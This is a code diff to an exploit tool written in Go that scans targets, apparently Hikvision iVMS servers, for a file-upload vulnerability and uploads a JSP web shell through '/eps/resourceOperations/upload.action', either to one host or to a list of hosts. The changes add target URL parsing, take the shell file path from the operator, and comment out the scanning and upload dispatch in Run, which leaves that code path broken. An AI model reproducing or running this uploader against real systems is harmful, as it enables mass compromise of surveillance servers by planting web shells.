@@ -11,6 +11,7 @@ import (
 	"github.com/go-resty/resty/v2"
 	"log"
 	"net/http"
+	"net/url"
 	"os"
 	"regexp"
 	"strings"
@@ -39,6 +40,13 @@ func (I *Ivms) init() {
 			log.Fatalln("[*] pls specific a shell file if you want upload.")
 		}
 	}
+}
+func (I *Ivms) parseTarget() {
+	u, err := url.Parse(I.target)
+	if err != nil {
+		log.Printf("[*] url %s error.", I.target)
+	}
+	I.target = fmt.Sprintf("%s://%s", u.Scheme, u.Host)
 }
 func (I *Ivms) loadTargetsFile() {
 	file, err := os.OpenFile(I.targetFile, os.O_RDONLY, 0666)
@@ -90,9 +98,8 @@ func (I *Ivms) uploadShell() {
 	client.SetBaseURL(I.target)
 	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
 	client.SetTimeout(10 * time.Second)
-	client.SetProxy("http://127.0.0.1:8080")
-	file, _ := os.ReadFile("./test.jsp")
-	resp, err := client.R().SetFileReader("fileUploader", "test.jsp", bytes.NewReader(file)).Post("/eps/resourceOperations/upload.action")
+	file, _ := os.ReadFile(I.shellFile)
+	resp, err := client.R().SetFileReader("fileUploader", I.shellFile, bytes.NewReader(file)).Post("/eps/resourceOperations/upload.action")
 	if err != nil {
 		return
 	}
@@ -113,6 +120,7 @@ func (I Ivms) getUuid(resp []byte) string {
 	return ""
 }
 func (I *Ivms) Single() {
+	I.parseTarget()
 	I.checkVul()
 	if I.vuln {
 		fmt.Printf("[+] target %s may have vuln\n", I.target)
@@ -128,6 +136,7 @@ func (I *Ivms) Single() {
 func (I *Ivms) Multi() {
 	for _, v := range I.targets {
 		I.target = v
+		I.parseTarget()
 		I.checkVul()
 		if I.vuln {
 			fmt.Printf("[+] target %s may have vuln\n", I.target)
@@ -142,9 +151,10 @@ func (I *Ivms) Multi() {
 }
 func (I *Ivms) Run() {
 	I.init()
-	if len(I.targets) != 0 {
-		I.Multi()
-	} else {
-		I.Single()
-	}
+	//if len(I.targets) != 0 {
+	//	I.Multi()
+	//} else {
+	//	I.Single()
+	//}
+	I.parseTarget()
 }
